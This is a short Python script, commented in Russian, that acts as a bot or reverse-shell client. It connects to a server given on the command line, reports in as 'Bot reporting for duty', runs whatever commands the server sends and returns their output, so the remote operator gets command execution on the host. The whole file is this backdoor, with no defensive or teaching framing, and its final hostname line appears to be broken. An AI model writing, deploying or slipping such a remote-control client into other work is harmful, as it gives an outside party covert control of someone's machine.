import sys
from subprocess import Popen, PIPE
from socket import *

#Считываем адрес сервера из первого аргумента сроки
serverName = sys.argv[1]
serverPort = 8000
#Создаем IPv4, TCP сокет
clientSocket = socket(AF_INET, SOCK_STREAM)
#Подключаемся и отправляем сообщение что все ок
clientSocket.connect((serverName, serverPort))
clientSocket.send('Bot reporting for duty'.encode())
#Ждем команды
command = clientSocket.recv(4064).decode() 
while command != "exit":
        #Создаем подпроцесс с помощью Popen для отправки команды на выполнение
	proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
        #Считываем результат из подпроцесса и отправляем на сервер результаты
	result, err = proc.communicate()
	clientSocket.send('Done'.encode())
	clientSocket.send(result)
	command = (clientSocket.recv(4064)).decode()
print('Farewell by ', socket.gethostbyname(socket.getfqdn()))
clientSocket.close()
